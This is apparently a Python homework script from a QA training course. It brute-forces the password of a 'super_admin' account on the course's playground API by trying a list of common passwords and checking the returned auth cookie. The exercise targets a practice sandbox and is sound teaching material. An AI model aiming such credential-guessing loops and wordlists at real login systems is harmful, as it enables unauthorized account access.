"""
Коллега говорит, что точно помнит свой login - это значение super_admin
А вот пароль забыл, но точно помнит, что выбрал его из списка самых популярных паролей на Википедии (вот тебе и супер админ...).
Ссылка: https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
Искать его нужно среди списка Top 25 most common passwords by year according to SplashData

Итак, наша задача - написать скрипт и указать в нем login нашего коллеги и все пароли из Википедии в виде списка.
Программа должна делать следующее:

1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework.
 В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.

2. Далее эту cookie мы должна передать во второй метод check_auth_cookie.
 Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный.
  В этом случае берем следующий пароль и все заново.
  Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.

Ответом к задаче должен быть верный пароль и ссылка на коммит со скриптом.
"""

import requests

pass_list = ['password', 'password', 123456, 123456789, 12345678, 12345, 'qwerty', 'abc123', 'football', 1234567,
             'monkey', 111111, 'letmein', 1234, 1234567890, 'dragon', 'baseball', 'sunshine', 'iloveyou',
             'trustno1', 'princess', 'adobe123', 'welcome', 'login', 'admin', 'abc123', 'qwerty123', 'solo', '1q2w3e4r',
             'master', 666666, 'photoshop', '1qaz2wsx', 'qwertyuiop', 'ashley', 123123, 'mustang', 121212,
             'starwars', 654321, 'bailey', 'access', 'flower', 555555, 'passw0rd', 'shadow', 'lovely', 7777777,
             'michael', '!@#$%^&*', 'jesus', 'password1', 'superman', 'hello', 'charlie', '888888',
             696969, 'hottie', 'freedom', 'aa123456', 'qazwsx', 'ninja', 'azerty', 'solo', 'loveme', 'whatever',
             'donald', 'batman', 'zaq1zaq1', 'Football', 0, '123qwe'
             ]
for i in pass_list:
    param = {'login': 'super_admin',
             'password': i}
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=param)
    auth_cookie = response.cookies.get('auth_cookie')

    check_response = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies={'auth_cookie': auth_cookie})
    if check_response.text != 'You are NOT authorized':
        print(f"Password is '{i}'. {check_response.text}")
        break